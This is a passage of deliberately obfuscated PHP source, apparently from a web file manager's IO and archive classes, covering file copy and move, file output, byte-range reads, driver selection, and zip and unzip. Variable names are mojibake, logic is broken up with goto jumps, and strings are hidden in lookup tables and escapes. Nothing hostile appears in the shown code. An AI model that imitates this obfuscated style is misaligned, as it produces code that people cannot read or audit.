$D§ÎÃÃÚ Ü); return $D§ÎÃÃÚ Ü; goto dËõ⁄∫ÁÜÍ; EÌö≈Ó÷è: if ($b§≥»‹¬‡) { return self::copyFile($cô√¶∂±Áõ, $f‹ãÛ¬Öó¡, $D•à®‹äﬂ”, $bå”∑‡‘∂Æ, $F⁄–’Ù¯Ë∏, $Bπï⁄æâ≈∏); } if ($DóéâÇÜÓç == REPEAT_RENAME_FOLDER) { $DóéâÇÜÓç = !1; } $Aù¬¡äëõ¿ = rtrim($bå”∑‡‘∂Æ, $e∂§ãÎ©ÿÙ[8]) . $e∂§ãÎ©ÿÙ[8] . $F⁄–’Ù¯Ë∏; goto D¢Œ•—ÉÖá; dËõ⁄∫ÁÜÍ: } private static function copyFile($eÇçéÕ€∫’, $BÀ÷ò”Ì …, $E›éù∫≈≠Ú, $AÁãíâ£öç, $a™£¿Ñ«ƒé, $fƒ–êò‚êÿ) { goto B£ù±£Æ∫; A™Ÿ√¨…˘ä: self::remove($bø®…™¥âŒ); Hook::trigger($dª»òÀ•çµ[1082], $eÇçéÕ€∫’, $BÀ÷ò”Ì …, $E›éù∫≈≠Ú, $AÁãíâ£öç, $a™£¿Ñ«ƒé, $Bé”ªÜä∏›); self::copyMoveKeepInfo($eÇçéÕ€∫’, $BÀ÷ò”Ì …, $Bé”ªÜä∏›); goto CÍè∂ÎÖ“÷; b’îª≠Æöà: Hook::trigger($dª»òÀ•çµ[1081], $eÇçéÕ€∫’, $BÀ÷ò”Ì …, $E›éù∫≈≠Ú, $AÁãíâ£öç, $a™£¿Ñ«ƒé, $Dà»”õ’°); if (self::driverIsSame($eÇçéÕ€∫’, $E›éù∫≈≠Ú)) { if ($fƒ–êò‚êÿ) { $Bé”ªÜä∏› = $E›éù∫≈≠Ú->moveFile($BÀ÷ò”Ì …, $AÁãíâ£öç); } else { $Bé”ªÜä∏› = $E›éù∫≈≠Ú->copyFile($BÀ÷ò”Ì …, $AÁãíâ£öç); } Hook::trigger($dª»òÀ•çµ[1082], $eÇçéÕ€∫’, $BÀ÷ò”Ì …, $E›éù∫≈≠Ú, $AÁãíâ£öç, $a™£¿Ñ«ƒé, $Bé”ªÜä∏›); self::copyMoveKeepInfo($eÇçéÕ€∫’, $BÀ÷ò”Ì …, $Bé”ªÜä∏›); return $Bé”ªÜä∏›; } $FÚ≈à®…ºú = TEMP_FILES; goto FÌŸﬂŒÎß¨; CÍè∂ÎÖ“÷: return $Bé”ªÜä∏›; goto f°∫…∑õÈ„; B£ù±£Æ∫: $dª»òÀ•çµ =& $_SERVER[’ÿƒ†ïò]; $AÁãíâ£öç = $E›éù∫≈≠Ú->getPath(rtrim($AÁãíâ£öç, $dª»òÀ•çµ[8]) . $dª»òÀ•çµ[8] . $a™£¿Ñ«ƒé); $Dà»”õ’° = $dª»òÀ•çµ[1080] . time() . rand_string(5); goto b’îª≠Æöà; FÌŸﬂŒÎß¨: if ($GLOBALS[$dª»òÀ•çµ[6]][$dª»òÀ•çµ[88]][$dª»òÀ•çµ[790]]) { $FÚ≈à®…ºú = $GLOBALS[$dª»òÀ•çµ[6]][$dª»òÀ•çµ[88]][$dª»òÀ•çµ[790]]; } $fƒ–êò‚êÿ = !0; $dÆà∂Ö≠·à = $FÚ≈à®…ºú; goto fﬂ‘ßŸ°≥Ñ; F∆È∂‰€ΩÜ: $eäü›Ë·üÑ = $eÇçéÕ€∫’->download($BÀ÷ò”Ì …, $eäü›Ë·üÑ); $eäü›Ë·üÑ = $eÇçéÕ€∫’->iconvApp($eäü›Ë·üÑ); $Bé”ªÜä∏› = $E›éù∫≈≠Ú->upload($AÁãíâ£öç, $eäü›Ë·üÑ, $fƒ–êò‚êÿ); goto A™Ÿ√¨…˘ä; fﬂ‘ßŸ°≥Ñ: mk_dir($dÆà∂Ö≠·à); $eäü›Ë·üÑ = $dÆà∂Ö≠·à . $Dà»”õ’°; $bø®…™¥âŒ = $eäü›Ë·üÑ; goto F∆È∂‰€ΩÜ; f°∫…∑õÈ„: } private static function copyMoveKeepInfo($Cíƒƒ—äÕÜ, $eÜüÃîêíÓ, $BıÉËÉ∏◊µ) { if (!$BıÉËÉ∏◊µ) { return; } $eÌ€à£äÊ≥ = $Cíƒƒ—äÕÜ->info($eÜüÃîêíÓ); if (!is_array($eÌ€à£äÊ≥)) { return; } IO::setModifyTime($BıÉËÉ∏◊µ, $eÌ€à£äÊ≥[$_SERVER[’ÿƒ†ïò][84]]); } public static function pathFather($fè™± ªùØ) { $d¥ˆ®ÒÁŒ“ = IO::init($fè™± ªùØ); $eπ÷‘Èæ¨Ç = $d¥ˆ®ÒÁŒ“->pathFather($d¥ˆ®ÒÁŒ“->path); return $d¥ˆ®ÒÁŒ“->getPathOuter($eπ÷‘Èæ¨Ç); } public static function fileOut($e‘ŸéØ¯í, $aÂÎêÑ˘›Á = false, $c§∫êÚèª´ = false, $Eô±‡Ÿê∫° = '') { $BıîÑÛùÂ¯ = self::driverMake($e‘ŸéØ¯í); if ($BıîÑÛùÂ¯->isFileOutServer()) { return $BıîÑÛùÂ¯->fileOutServer($e‘ŸéØ¯í, $aÂÎêÑ˘›Á, $c§∫êÚèª´, $Eô±‡Ÿê∫°); } return $BıîÑÛùÂ¯->fileOut($e‘ŸéØ¯í, $aÂÎêÑ˘›Á, $c§∫êÚèª´, $Eô±‡Ÿê∫°); } public static function fileOutImage($BòÂù™∫˜Ù, $fÏÔáﬂ¡¥◊ = 250) { $a∫‘“Ö÷·ﬂ = array(250, 600, 1200, 2000, 3000, 5000); for ($F´êëÛ®Æé = 0; $F´êëÛ®Æé < count($a∫‘“Ö÷·ﬂ); $F´êëÛ®Æé++) { if ($F´êëÛ®Æé == 0 && $fÏÔáﬂ¡¥◊ <= $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé]) { $fÏÔáﬂ¡¥◊ = $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé]; break; } else { if ($fÏÔáﬂ¡¥◊ > $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé - 1] && $fÏÔáﬂ¡¥◊ <= $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé]) { $fÏÔáﬂ¡¥◊ = $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé]; break; } else { if ($F´êëÛ®Æé == count($a∫‘“Ö÷·ﬂ) - 1 && $fÏÔáﬂ¡¥◊ > $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé]) { $fÏÔáﬂ¡¥◊ = $a∫‘“Ö÷·ﬂ[$F´êëÛ®Æé]; break; } } } } $DÔÖ÷ÃÌÁﬁ = self::driverMake($BòÂù™∫˜Ù); if ($DÔÖ÷ÃÌÁﬁ->isFileOutServer()) { return $DÔÖ÷ÃÌÁﬁ->fileOutImageServer($BòÂù™∫˜Ù, $fÏÔáﬂ¡¥◊); } return $DÔÖ÷ÃÌÁﬁ->fileOutImage($BòÂù™∫˜Ù, $fÏÔáﬂ¡¥◊); } private static function driverIsSame($d≤µÕπ…”®, $eµÜû·êÌå) { goto cç»µÑ‰Ãè; FÕÔ´Øª”Ö: if ($d≤µÕπ…”®->pathDriver == $eµÜû·êÌå->pathDriver) { return !0; } return !1; goto Aâ∏éáñ‹Æ; Fû∞∑√áÁ≤: if ($DëÖ…Ûƒùâ != $EÍƒ⁄¥‚åÚ) { return !1; } if ($DëÖ…Ûƒùâ == $E°∆áÜú∂ç[746]) { return !0; } if ($DëÖ…Ûƒùâ == $E°∆áÜú∂ç[106]) { return !0; } goto FÕÔ´Øª”Ö; cç»µÑ‰Ãè: $E°∆áÜú∂ç =& $_SERVER[’ÿƒ†ïò]; $DëÖ…Ûƒùâ = $d≤µÕπ…”®->getType(); $EÍƒ⁄¥‚åÚ = $eµÜû·êÌå->getType(); goto Fû∞∑√áÁ≤; Aâ∏éáñ‹Æ: } public static function copyUpdate($eõÀÙœ‰∆ê, $C–è‡ÛÍ≤™) { goto EëûÌÜ°Ò‹; eƒ–∏ÿ≤˘∆: $Eπ≠ï’À›≠ = self::_listAll($eõÀÙœ‰∆ê); $f–ÿ◊√∆ ˜ = self::_listAll($C–è‡ÛÍ≤™); $e´ÍÉ∑≤·¬ = array(); goto cË·£≤Ã¨≥; Bû™…ªê©µ: Hook::trigger($F¿π’åÎßç[1086], $eõÀÙœ‰∆ê, $C–è‡ÛÍ≤™, $eüæÁÈ“¬Ã); foreach ($BÒà©⁄ ˘º as $d¡ÕÕ„ê™Œ) { IO::mkdir($d¡ÕÕ„ê™Œ); } foreach ($e´ÍÉ∑≤·¬ as $d¡ÕÕ„ê™Œ) { IO::copy($d¡ÕÕ„ê™Œ[$F¿π’åÎßç[1083]], $d¡ÕÕ„ê™Œ[$F¿π’åÎßç[1084]], REPEAT_REPLACE); } goto D’÷ÕçòÀ; cË·£≤Ã¨≥: $BÒà©⁄ ˘º = array(); foreach ($Eπ≠ï’À›≠ as $FäöÕÉæµÑ => $d¡ÕÕ„ê™Œ) { if (isset($f–ÿ◊√∆ ˜[$FäöÕÉæµÑ])) { if ($d¡ÕÕ„ê™Œ[$F¿π’åÎßç[77]] == 1) { continue; } if ($f–ÿ◊√∆ ˜[$FäöÕÉæµÑ][$F¿π’åÎßç[78]] == $d¡ÕÕ„ê™Œ[$F¿π’åÎßç[78]]) { continue; } } if ($d¡ÕÕ„ê™Œ[$F¿π’åÎßç[77]] == 1) { $BÒà©⁄ ˘º[] = $C–è‡ÛÍ≤™ . $F¿π’åÎßç[8] . $FäöÕÉæµÑ; continue; } $Bêè≈◊†•õ = strstr(trim($FäöÕÉæµÑ, $F¿π’åÎßç[8]), $F¿π’åÎßç[8]) ? get_path_father($FäöÕÉæµÑ) : $F¿π’åÎßç[33]; $e´ÍÉ∑≤·¬[] = array($F¿π’åÎßç[1083] => $d¡ÕÕ„ê™Œ[$F¿π’åÎßç[76]], $F¿π’åÎßç[1084] => rtrim($C–è‡ÛÍ≤™, $F¿π’åÎßç[8]) . $F¿π’åÎßç[8] . $Bêè≈◊†•õ, $F¿π’åÎßç[1085] => $d¡ÕÕ„ê™Œ); } $eüæÁÈ“¬Ã = array($F¿π’åÎßç[193] => $e´ÍÉ∑≤·¬, $F¿π’åÎßç[77] => $BÒà©⁄ ˘º); goto Bû™…ªê©µ; EëûÌÜ°Ò‹: $F¿π’åÎßç =& $_SERVER[’ÿƒ†ïò]; if (!IO::exist($eõÀÙœ‰∆ê)) { return !1; } if (!IO::exist($C–è‡ÛÍ≤™)) { IO::mkdir($C–è‡ÛÍ≤™); } goto eƒ–∏ÿ≤˘∆; D’÷ÕçòÀ: } private static function _listAll($C≈Óà≥∆ßç) { $b®¬É¥◊àä =& $_SERVER[’ÿƒ†ïò]; $C≈Óà≥∆ßç = KodIO::clear($C≈Óà≥∆ßç); $Aƒêˆº°∂Ô = IO::listAll($C≈Óà≥∆ßç); foreach ($Aƒêˆº°∂Ô as &$bÛ¥ôññ⁄ô) { $eì‹æ‰£ë‹ = substr($bÛ¥ôññ⁄ô[$b®¬É¥◊àä[76]], strlen($C≈Óà≥∆ßç)); $bÛ¥ôññ⁄ô[$b®¬É¥◊àä[1087]] = trim($eì‹æ‰£ë‹, $b®¬É¥◊àä[8]); } unset($bÛ¥ôññ⁄ô); return array_to_keyvalue($Aƒêˆº°∂Ô, $b®¬É¥◊àä[1087]); } public static function fileSubstr($eê´®ÒÛÁâ, $FÎÀ≤…ß¨‚, $cÎÏπ÷ıÿ© = false) { goto AîåßÇ¿âµ; f£ıˆè— ≥: if (!$fáÑ∑êèûÈ && $cÎÏπ÷ıÿ© && isset($GLOBALS[$dìØàà‘ÈÏ[1090]])) { throw new Exception($GLOBALS[$dìØàà‘ÈÏ[1090]][$dìØàà‘ÈÏ[1091]]); } return $fáÑ∑êèûÈ; goto f»«âÒôÇ≈; f‰“üöçÜÊ: if ($cÎÏπ÷ıÿ© === !1) { $cÎÏπ÷ıÿ© = $CÙö‘≥∏ÛÂ - $FÎÀ≤…ß¨‚; } if ($FÎÀ≤…ß¨‚ + $cÎÏπ÷ıÿ© > $CÙö‘≥∏ÛÂ) { $cÎÏπ÷ıÿ© = $CÙö‘≥∏ÛÂ - $FÎÀ≤…ß¨‚; } if (!$CÙö‘≥∏ÛÂ && $aÙ†©ﬂ°ê»->getType() == $dìØàà‘ÈÏ[106] && !$aÙ†©ﬂ°ê»->exist($eê´®ÒÛÁâ)) { throw new Exception($dìØàà‘ÈÏ[1088] . LNG($dìØàà‘ÈÏ[1089]) . $dìØàà‘ÈÏ[954] . get_path_this($eê´®ÒÛÁâ) . $dìØàà‘ÈÏ[33]); } goto bÕ∑ìÃ¶á›; AîåßÇ¿âµ: $dìØàà‘ÈÏ =& $_SERVER[’ÿƒ†ïò]; $aÙ†©ﬂ°ê» = self::driverMake($eê´®ÒÛÁâ); $CÙö‘≥∏ÛÂ = $aÙ†©ﬂ°ê»->size($eê´®ÒÛÁâ); goto A„Ü ãıä∆; bÕ∑ìÃ¶á›: if ($cÎÏπ÷ıÿ© <= 0) { return $dìØàà‘ÈÏ[33]; } if ($FÎÀ≤…ß¨‚ < 0 || $FÎÀ≤…ß¨‚ >= $CÙö‘≥∏ÛÂ || $cÎÏπ÷ıÿ© > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\122\145\141\x64\x20\145\162\162\157\x72\41\40\x73\164\141\x72\164\75{$FÎÀ≤…ß¨‚}\x3b\x6c\145\x6e\147\x74\150\75{$cÎÏπ÷ıÿ©}\x3b\40\x73\x69\x7a\145\75{$CÙö‘≥∏ÛÂ}\x3b"); } $fáÑ∑êèûÈ = $aÙ†©ﬂ°ê»->fileSubstr($eê´®ÒÛÁâ, $FÎÀ≤…ß¨‚, $cÎÏπ÷ıÿ©); goto f£ıˆè— ≥; A„Ü ãıä∆: $cÌÈ…í˘¥— = $FÎÀ≤…ß¨‚; $c¶±Ô°ﬁÀŒ = $cÎÏπ÷ıÿ©; if ($FÎÀ≤…ß¨‚ < 0) { $FÎÀ≤…ß¨‚ = $CÙö‘≥∏ÛÂ + $FÎÀ≤…ß¨‚; } goto f‰“üöçÜÊ; f»«âÒôÇ≈: } private static function driverMake(&$dØö∫≥‚Ÿ÷) { goto C™ÿá¨≈¯∆; FÂæ¥ãø©®: if ($D±ä˘¨†–§[$c≥Øú¯ßçÁ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$D±ä˘¨†–§[$c≥Øú¯ßçÁ[395]]]) { return !1; } $dØö∫≥‚Ÿ÷ = $D±ä˘¨†–§[$c≥Øú¯ßçÁ[1092]]; $dáß∆Ô¢±ú = self::driverGet($D±ä˘¨†–§, $dØö∫≥‚Ÿ÷); goto DÌÔÃïÿ‰÷; C™ÿá¨≈¯∆: $c≥Øú¯ßçÁ =& $_SERVER[’ÿƒ†ïò]; $D±ä˘¨†–§ = KodIO::parse($dØö∫≥‚Ÿ÷); if (!self::$driverListSystem) { $fà§ò÷ï∞€ = Model($c≥Øú¯ßçÁ[755])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($fà§ò÷ï∞€, $c≥Øú¯ßçÁ[395]); } goto FÂæ¥ãø©®; DÌÔÃïÿ‰÷: return $dáß∆Ô¢±ú; goto FíÚ¶å˜Ââ; FíÚ¶å˜Ââ: } private static function driverGet($fúÛ⁄”‰û√, &$c⁄€É–öêÂ) { goto dç¬’ÁÈ∆é; C»¢Ò∞∫Ÿë: $e∏êÏ⁄˘ñœ = self::$driverCache[$CØÀ ‚◊ª∑]; $e∏êÏ⁄˘ñœ->pathDriver = $fºè≈æ◊Ÿ§; $e∏êÏ⁄˘ñœ->pathBase = $c≥°ò®≠ˆï[33]; goto eæö™ﬂ∑˜Ü; eÿ Œ¯ÏÜ◊: $e∏êÏ⁄˘ñœ->path = $c⁄€É–öêÂ; return $e∏êÏ⁄˘ñœ; goto BÕç‚‘©†ò; eæö™ﬂ∑˜Ü: if (isset($F„ïÜë«äê[$c≥°ò®≠ˆï[6]][$c≥°ò®≠ˆï[1104]])) { $e∏êÏ⁄˘ñœ->pathBase = rtrim($F„ïÜë«äê[$c≥°ò®≠ˆï[6]][$c≥°ò®≠ˆï[1104]], $c≥°ò®≠ˆï[8]) . $c≥°ò®≠ˆï[8]; $c⁄€É–öêÂ = $e∏êÏ⁄˘ñœ->pathBase . ltrim($c⁄€É–öêÂ, $c≥°ò®≠ˆï[8]); } $c⁄€É–öêÂ = $e∏êÏ⁄˘ñœ->getPath($c⁄€É–öêÂ); if (isset($fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1076]])) { $c⁄€É–öêÂ = $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1076]]; } goto eÿ Œ¯ÏÜ◊; dç¬’ÁÈ∆é: $c≥°ò®≠ˆï =& $_SERVER[’ÿƒ†ïò]; $fºè≈æ◊Ÿ§ = $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1093]]; $d°∑˘Öâîµ = $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[395]]; goto CΩ∞›õÜ…Ô; CΩ∞›õÜ…Ô: switch ($fúÛ⁄”‰û√[$c≥°ò®≠ˆï[29]]) { case KodIO::KOD_IO: $F„ïÜë«äê = self::$driverListSystem[$d°∑˘Öâîµ]; break; case KodIO::KOD_SOURCE: $c⁄€É–öêÂ = $d°∑˘Öâîµ . $c⁄€É–öêÂ; $F„ïÜë«äê = array($c≥°ò®≠ˆï[1094] => $c≥°ò®≠ˆï[1095], $c≥°ò®≠ˆï[6] => $fúÛ⁄”‰û√); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FπÈµì´Ë» = $GLOBALS[$c≥°ò®≠ˆï[1096]]; self::$driverListUser = array_to_keyvalue($FπÈµì´Ë», $c≥°ò®≠ˆï[395]); } $F„ïÜë«äê = self::$driverListUser[$d°∑˘Öâîµ]; break; case KodIO::KOD_SHARE_LINK: $F„ïÜë«äê = array($c≥°ò®≠ˆï[1094] => $c≥°ò®≠ˆï[1097], $c≥°ò®≠ˆï[6] => $fúÛ⁄”‰û√); $aâËÿäÏ∆Ë = Action($c≥°ò®≠ˆï[1098])->sharePathInfo($fúÛ⁄”‰û√[$c≥°ò®≠ˆï[76]]); $c⁄€É–öêÂ = $aâËÿäÏ∆Ë[$c≥°ò®≠ˆï[397]]; if (!$aâËÿäÏ∆Ë[$c≥°ò®≠ˆï[397]]) { $cè±±Ÿ§¥° = Model($c≥°ò®≠ˆï[589])->getInfo($aâËÿäÏ∆Ë[$c≥°ò®≠ˆï[482]]); $c⁄€É–öêÂ = KodIO::clear($cè±±Ÿ§¥°[$c≥°ò®≠ˆï[1099]] . $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1092]]); $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[480]] = $cè±±Ÿ§¥°; $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1076]] = $c⁄€É–öêÂ; $F„ïÜë«äê = array($c≥°ò®≠ˆï[1094] => $c≥°ò®≠ˆï[1100], $c≥°ò®≠ˆï[6] => $fúÛ⁄”‰û√); } break; case KodIO::KOD_SHARE_ITEM: $F„ïÜë«äê = array($c≥°ò®≠ˆï[1094] => $c≥°ò®≠ˆï[1101], $c≥°ò®≠ˆï[6] => $fúÛ⁄”‰û√); $cè±±Ÿ§¥° = Model($c≥°ò®≠ˆï[589])->getInfo($fúÛ⁄”‰û√[$c≥°ò®≠ˆï[395]]); if ($cè±±Ÿ§¥°[$c≥°ò®≠ˆï[397]] == $c≥°ò®≠ˆï[191]) { $c⁄€É–öêÂ = KodIO::clear($cè±±Ÿ§¥°[$c≥°ò®≠ˆï[1099]] . $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1092]]); $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[480]] = $cè±±Ÿ§¥°; $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[1076]] = $c⁄€É–öêÂ; $F„ïÜë«äê = array($c≥°ò®≠ˆï[1094] => $c≥°ò®≠ˆï[1102], $c≥°ò®≠ˆï[6] => $fúÛ⁄”‰û√); } else { if (!$c⁄€É–öêÂ) { $c⁄€É–öêÂ = $cè±±Ÿ§¥°[$c≥°ò®≠ˆï[397]]; } } break; default: $c⁄€É–öêÂ = $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[76]]; $F„ïÜë«äê = array($c≥°ò®≠ˆï[1094] => $c≥°ò®≠ˆï[1103]); break; } $CØÀ ‚◊ª∑ = $fúÛ⁄”‰û√[$c≥°ò®≠ˆï[76]]; if (!isset(self::$driverCache[$CØÀ ‚◊ª∑])) { $fÂÍ∑Ú˘¬à = strtolower($F„ïÜë«äê[$c≥°ò®≠ˆï[94]]); $EªΩÉ¯Ú¡≥ = $GLOBALS[$c≥°ò®≠ˆï[6]][$c≥°ò®≠ˆï[88]][$c≥°ò®≠ˆï[821]]; $CÀÈÓÆ•Ô» = $c≥°ò®≠ˆï[72] . (isset($EªΩÉ¯Ú¡≥[$fÂÍ∑Ú˘¬à]) ? $EªΩÉ¯Ú¡≥[$fÂÍ∑Ú˘¬à] : ucfirst($fÂÍ∑Ú˘¬à)); if (!class_exists($CÀÈÓÆ•Ô»)) { show_json("{$CÀÈÓÆ•Ô»}\40\156\157\164\40\x65\x78\151\163\164\163\x21", !1); } $a≠†üÂâ≤∑ = isset($F„ïÜë«äê[$c≥°ò®≠ˆï[6]]) ? $F„ïÜë«äê[$c≥°ò®≠ˆï[6]] : !1; self::$driverCache[$CØÀ ‚◊ª∑] = new $CÀÈÓÆ•Ô»($a≠†üÂâ≤∑); } goto C»¢Ò∞∫Ÿë; BÕç‚‘©†ò: } public static function errorTips($cËÂ –Í≤Ü = false) { goto f∂ß·†ªÃÌ; B ãòâéë≤: $Eè¯ﬁ—Ó€è[] = $cËÂ –Í≤Ü; write_log($B§ıç¶≠Ëë[160] . ACTION . $B§ıç¶≠Ëë[1105] . $cËÂ –Í≤Ü, $B§ıç¶≠Ëë[1106]); goto eºëé¿ÉæÀ; f∂ß·†ªÃÌ: $B§ıç¶≠Ëë =& $_SERVER[’ÿƒ†ïò]; static $Eè¯ﬁ—Ó€è = array(); $eêŸııë¿¿ = 1000; goto CŒèÊÜÍµ§; CŒèÊÜÍµ§: if ($cËÂ –Í≤Ü === -1) { return $Eè¯ﬁ—Ó€è ? $Eè¯ﬁ—Ó€è[count($Eè¯ﬁ—Ó€è) - 1] : $B§ıç¶≠Ëë[33]; } if ($cËÂ –Í≤Ü === !1) { return implode($B§ıç¶≠Ëë[229], $Eè¯ﬁ—Ó€è); } if (count($Eè¯ﬁ—Ó€è) >= $eêŸııë¿¿) { $Eè¯ﬁ—Ó€è = array_slice($Eè¯ﬁ—Ó€è, $eêŸııë¿¿ * 0.5, $eêŸııë¿¿); } goto B ãòâéë≤; eºëé¿ÉæÀ: } public static function getLastError($Dè¿∞ÛÌ…ö = '') { $cº‘ºá¨›§ = self::errorTips(-1); return $cº‘ºá¨›§ ? $cº‘ºá¨›§ : $Dè¿∞ÛÌ…ö; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $cÓá¡‚´…•; if (!$cÓá¡‚´…•) { $CÈÖû≤÷â’ = IO::init($_SERVER[’ÿƒ†ïò][8]); } return $CÈÖû≤÷â’; } private static function iconvSystem($e‘ñÿÊπäÁ) { return self::local()->iconvSystem($e‘ñÿÊπäÁ); } private static function iconvApp($d—Ô•Éà—Ì) { return self::local()->iconvApp($d—Ô•Éà—Ì); } public static function zip($cÉ¥Ôá…≤Â, $f ô≥ÜÎŸ¨ = "\x7a\151\x70", $FÍ´≥ñˆÎ¿ = '', $bÃùì°†ÌÑ = REPEAT_RENAME) { goto a‚•∏˜ÉÁ≥; CàÑ∏÷Ïï¥: if (count($C›ãúè®¶¶) > 1) { $EŒëπÁ∑ Ì = IO::info(IO::pathFather($a¡é®Â‘ö‘[$Aﬁ«∑ÍÜÓ≤[76]])); $fë¨Ω–æ¢∆ = $EŒëπÁ∑ Ì[$Aﬁ«∑ÍÜÓ≤[28]]; } $Eß’®›Œí∆ = $Cœé©ÆËñ∆; if (!$Eß’®›Œí∆) { $Eß’®›Œí∆ = get_path_father($a¡é®Â‘ö‘[$Aﬁ«∑ÍÜÓ≤[76]]); if (!$FÍ´≥ñˆÎ¿ && $a©ÇâÔïÎã->getType() == $Aﬁ«∑ÍÜÓ≤[106]) { $Eß’®›Œí∆ = get_path_father($a©ÇâÔïÎã->path); } $B£◊àΩˆ⁄… = IO::info($Eß’®›Œí∆); if (!$B£◊àΩˆ⁄…[$Aﬁ«∑ÍÜÓ≤[196]]) { show_json(LNG($Aﬁ«∑ÍÜÓ≤[1108]), !1); } } goto FüÂó⁄€Ìæ; AÁË–ﬁõÔí: if ($FÍ´≥ñˆÎ¿ || !$Cœé©ÆËñ∆) { if ($Cœé©ÆËñ∆ && strstr($Cœé©ÆËñ∆, TEMP_FILES)) { $AÏ¶∏√àéË = $C›ãúè®¶¶ = array(); recursion_dir($Eß’®›Œí∆, $AÏ¶∏√àéË, $C›ãúè®¶¶, 0); foreach ($AÏ¶∏√àéË as $BÑ∂∫≈ΩÓù) { del_dir($BÑ∂∫≈ΩÓù); } foreach ($C›ãúè®¶¶ as $e˘ŸêÚπ“Ü) { if ($e˘ŸêÚπ“Ü == $DóÿΩÒ—®Ò) { continue; } del_file($e˘ŸêÚπ“Ü); } } return $EçÕñ’ÊÂƒ; } $EÁÒ◊å¿—ì = self::pathFather($a¡é®Â‘ö‘[$Aﬁ«∑ÍÜÓ≤[76]]); $a‡‡ÈÛﬂÃ‹ = self::move($EçÕñ’ÊÂƒ, $EÁÒ◊å¿—ì, $bÃùì°†ÌÑ); goto F‚ÇÔ›ó·í; a‚•∏˜ÉÁ≥: $Aﬁ«∑ÍÜÓ≤ =& $_SERVER[’ÿƒ†ïò]; $a©ÇâÔïÎã = self::init($cÉ¥Ôá…≤Â[0][$Aﬁ«∑ÍÜÓ≤[76]]); $a¡é®Â‘ö‘ = self::info($cÉ¥Ôá…≤Â[0][$Aﬁ«∑ÍÜÓ≤[76]]); goto bèΩ Á‹ÀÜ; F‚ÇÔ›ó·í: if (!$a‡‡ÈÛﬂÃ‹) { del_dir($Cœé©ÆËñ∆); show_json(LNG($Aﬁ«∑ÍÜÓ≤[1109]), !1); } del_dir($Cœé©ÆËñ∆); return $a‡‡ÈÛﬂÃ‹; goto c¢èçÉ§Ëﬁ; FüÂó⁄€Ìæ: $EçÕñ’ÊÂƒ = $Eß’®›Œí∆ . $fë¨Ω–æ¢∆ . $Aﬁ«∑ÍÜÓ≤[95] . $f ô≥ÜÎŸ¨; $EçÕñ’ÊÂƒ = get_filename_auto($EçÕñ’ÊÂƒ, $Aﬁ«∑ÍÜÓ≤[33], $bÃùì°†ÌÑ); $DóÿΩÒ—®Ò = self::iconvSystem($EçÕñ’ÊÂƒ); goto b“ù™ä∆æŒ; b“ù™ä∆æŒ: foreach ($C›ãúè®¶¶ as $Eﬂ¯çà™›Ÿ => $EÖ≈˘ÏæÇÛ) { $C›ãúè®¶¶[$Eﬂ¯çà™›Ÿ] = self::iconvSystem($EÖ≈˘ÏæÇÛ); } KodArchive::create($DóÿΩÒ—®Ò, $C›ãúè®¶¶); if (!IO::exist($EçÕñ’ÊÂƒ)) { if ($Cœé©ÆËñ∆) { del_dir($Cœé©ÆËñ∆); } show_json(LNG($Aﬁ«∑ÍÜÓ≤[1109]), !1); } goto AÁË–ﬁõÔí; bèΩ Á‹ÀÜ: $Cœé©ÆËñ∆ = !1; if (!$FÍ´≥ñˆÎ¿ && $a©ÇâÔïÎã->getType() == $Aﬁ«∑ÍÜÓ≤[106]) { $C›ãúè®¶¶ = self::zipFileList($cÉ¥Ôá…≤Â); } else { $Cœé©ÆËñ∆ = $FÍ´≥ñˆÎ¿ ? $FÍ´≥ñˆÎ¿ : TEMP_FILES . $Aﬁ«∑ÍÜÓ≤[1107] . time() . rand_string(8) . $Aﬁ«∑ÍÜÓ≤[8]; mk_dir($Cœé©ÆËñ∆); $C›ãúè®¶¶ = self::zipFileList($cÉ¥Ôá…≤Â, $Cœé©ÆËñ∆); } $fë¨Ω–æ¢∆ = $a¡é®Â‘ö‘[$Aﬁ«∑ÍÜÓ≤[28]]; goto CàÑ∏÷Ïï¥; c¢èçÉ§Ëﬁ: } public static function unzip($D“¶Íìââ∆, $B™àåõ›È¢ = "\162\x65\160\154\141\x63\145") { goto b·£ÀÙäå≈; f°±ºüπÛƒ: Hook::trigger($aõ≥ﬂèÂ¬¢[1117], $cÚ◊â¶∫Ìó); recursion_dir($cÚ◊â¶∫Ìó, $F—∑∑åËÆï, $eÈÑˆ˜à÷§, 0); $C£Á¶œ æÜ = array_merge($F—∑∑åËÆï, $eÈÑˆ˜à÷§); goto CãÈà’ÂÈ‹; a©ä¶†∑¢à: $eâÊÌ±⁄ø• = KodArchive::extract($f’Æ∑üÑ¨à, $cÚ◊â¶∫Ìó . $aõ≥ﬂèÂ¬¢[8], $cìÕ¶áÜª®); self::archiveExt(); if (!$eâÊÌ±⁄ø•[$aõ≥ﬂèÂ¬¢[1114]]) { show_json($aõ≥ﬂèÂ¬¢[1115] . $eâÊÌ±⁄ø•[$aõ≥ﬂèÂ¬¢[1116]], !1); } goto f°±ºüπÛƒ; Dõﬂ©ªﬁÎ: return !0; goto CàµøƒÑ¿å; b·£ÀÙäå≈: $aõ≥ﬂèÂ¬¢ =& $_SERVER[’ÿƒ†ïò]; $CáªèßàîØ = $D“¶Íìââ∆[$aõ≥ﬂèÂ¬¢[76]]; $fë√ﬁî∏Ö√ = $D“¶Íìââ∆[$aõ≥ﬂèÂ¬¢[1110]]; goto F¢±Œ«Øæ; fæÙäãÉüñ: $Aòÿ⁄Ãº≠ú = 